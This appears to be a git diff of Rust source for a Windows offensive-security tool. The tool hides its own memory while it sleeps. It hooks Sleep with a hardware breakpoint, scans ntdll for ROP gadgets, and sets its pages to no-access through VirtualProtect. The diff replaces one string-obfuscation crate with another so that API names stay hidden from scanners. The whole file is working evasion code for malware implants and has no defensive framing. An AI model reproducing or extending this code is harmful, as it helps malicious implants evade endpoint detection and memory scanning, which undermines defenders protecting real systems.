@@ -1,7 +1,7 @@
 #[macro_use]
-extern crate litcrypt;
-use_litcrypt!();
 
+
+use obfstr;
 use std::{ptr::copy_nonoverlapping, mem::size_of, ffi::c_void};
 
 use bindings::Windows::Win32::{System::{Diagnostics::Debug::{IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER}, Memory::MEMORY_BASIC_INFORMATION, SystemInformation::SYSTEM_INFO, Threading::GetCurrentProcess}};
@@ -21,8 +21,8 @@ pub extern "Rust" fn start()
     {
         loop 
         {
-            let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
-            let sleep_addr = dinvoke::get_function_address(k32, &lc!("Sleep")) as *mut c_void;
+            let k32 = dinvoke::get_module_base_address(&obfstr::obfstr!("kernel32.dll"));
+            let sleep_addr = dinvoke::get_function_address(k32, &obfstr::obfstr!("Sleep")) as *mut c_void;
             let handler = breakpoint_handler as usize;
             dinvoke::set_unhandled_exception_filter(handler);
             dinvoke::set_hardware_breakpoint(sleep_addr as usize);
@@ -30,7 +30,7 @@ pub extern "Rust" fn start()
             let f:data::Sleep;
             let _r: Option<()>;
             println!("[ZzZ] Sleeping...");
-            dinvoke::dynamic_invoke!(k32,&lc!("Sleep"),f,_r,15000);
+            dinvoke::dynamic_invoke!(k32,&obfstr::obfstr!("Sleep"),f,_r,15000);
             println!("  \\ We are back!");
             println!("--------------------------");
         }
@@ -62,7 +62,7 @@ pub unsafe extern "system" fn breakpoint_handler (exceptioninfo: *mut EXCEPTION_
                 let mut gag4_addr = 0usize;
                 let mut gag5_addr = 0usize;
                 let main_address = start as usize;
-                let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
+                let ntdll = dinvoke::get_module_base_address(&obfstr::obfstr!("ntdll.dll"));
                 let ba: *const u8 =  std::mem::transmute(ntdll);
                 let pe_info = get_pe_metadata(ba).unwrap();
 
@@ -111,7 +111,7 @@ pub unsafe extern "system" fn breakpoint_handler (exceptioninfo: *mut EXCEPTION_
 
                 if gag1_addr == 0 || gag2_addr == 0 || gag3_addr == 0 || gag4_addr == 0 || gag5_addr == 0
                 {
-                    println!("{}", &lc!("[x] Gadget not found."));
+                    println!("{}", &obfstr::obfstr!("[x] Gadget not found."));
                     return -1;
                 }
 
@@ -147,9 +147,9 @@ pub unsafe extern "system" fn breakpoint_handler (exceptioninfo: *mut EXCEPTION_
                 }
                 
             
-                let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
-                let virtual_protect_addr = dinvoke::get_function_address(k32, &lc!("VirtualProtect")) as *mut c_void;
-                let sleep_addr = dinvoke::get_function_address(k32, &lc!("SleepEx")) as *mut c_void;
+                let k32 = dinvoke::get_module_base_address(&obfstr::obfstr!("kernel32.dll"));
+                let virtual_protect_addr = dinvoke::get_function_address(k32, &obfstr::obfstr!("VirtualProtect")) as *mut c_void;
+                let sleep_addr = dinvoke::get_function_address(k32, &obfstr::obfstr!("SleepEx")) as *mut c_void;
                 let address = page as *const c_void;
                 let protection = 0x1u32; // PAGE_NOACCESS
                 let old = 0u32;
@@ -241,7 +241,7 @@ pub fn get_pe_metadata (module_ptr: *const u8) -> Result<PeMetadata,String> {
 
         if pe_metadata.pe != 0x4550 
         {
-            return Err(lc!("[x] Invalid PE signature."));
+            return Err(obfstr::obfstr!("[x] Invalid PE signature.").to_string());
         }
 
         pe_metadata.image_file_header = *((module_ptr as u64 + e_lfanew as u64 + 0x4) as *mut IMAGE_FILE_HEADER);
@@ -263,7 +263,7 @@ pub fn get_pe_metadata (module_ptr: *const u8) -> Result<PeMetadata,String> {
         } 
         else 
         {
-            return Err(lc!("[x] Invalid magic value."));
+            return Err(obfstr::obfstr!("[x] Invalid magic value.").to_string());
         }
 
         let mut sections: Vec<IMAGE_SECTION_HEADER> = vec![];
